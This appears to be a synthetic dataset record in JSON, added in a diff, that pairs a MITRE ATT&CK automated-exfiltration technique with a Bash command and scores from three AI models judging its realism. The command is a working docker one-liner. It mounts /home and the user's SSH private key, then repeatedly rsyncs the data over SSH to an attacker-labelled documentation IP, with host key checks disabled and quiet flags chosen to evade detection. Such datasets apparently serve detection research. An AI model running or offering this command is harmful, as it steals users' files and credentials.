@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "docker run -d --rm --name exfil_docs --network host -v /home:/data:ro -v $HOME/.ssh/id_rsa:/keys/id_rsa:ro instrumentisto/rsync-ssh:alpine sh -c 'while true; do rsync -azq -e \"ssh -i /keys/id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null\" /data/ attacker@203.0.113.15:/srv/ingest/$(hostname)/home/; sleep 900; done'",
+  "explanation": "Performs quiet, incremental, automated exfiltration of /home using rsync over SSH in a loop for reduced footprint and bandwidth.",
+  "rationale_steps": [
+    "Uses docker to mount host directory read-only",
+    "Rsync with compression and quiet mode reduces detection and data size",
+    "SSH options avoid prompts and logs minimal output",
+    "Repeating loop provides automated periodic exfiltration"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-3bfa6c8a-7b9c5974",
+  "source_prompt_hash": "3bfa6c8a",
+  "timestamp_utc": "2025-09-30T09:14:36.595419Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed docker run with balanced quoting, valid flags, and a correct sh loop invoking rsync/ssh.",
+        "semantic_score": 4,
+        "semantic_justification": "Automates periodic, quiet rsync over SSH to exfiltrate /home with compression, but depends on the SSH key’s presence/permissions and uses the container hostname (and a documentation IP) which slightly reduces realism.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T03:59:27.602358Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper shell escaping within the inner SSH command string, valid Docker flags, correct volume mount syntax, and properly structured while loop with semicolons.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1020 automated exfiltration: it uses Docker to isolate the process, mounts /home read-only and the SSH key, runs rsync over SSH in a persistent loop with 15-minute intervals, uses quiet/incremental flags to reduce footprint, disables host key checking to avoid interactive prompts, and transfers to an external attacker-controlled IP — fully matching the described automated, scheduled, low-noise exfiltration behavior.",
+        "combined_score": 5.0,
+        "confidence": 0.97,
+        "timestamp": "2026-02-18T22:25:00.629014Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly structured with correct Docker volume mounting, shell looping, and nested quoting for the rsync/ssh execution.",
+        "semantic_score": 5,
+        "semantic_justification": "The use of rsync over SSH in a timed loop within a container is a highly realistic and effective method for automated, incremental exfiltration (T1020).",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:25:04.802261Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
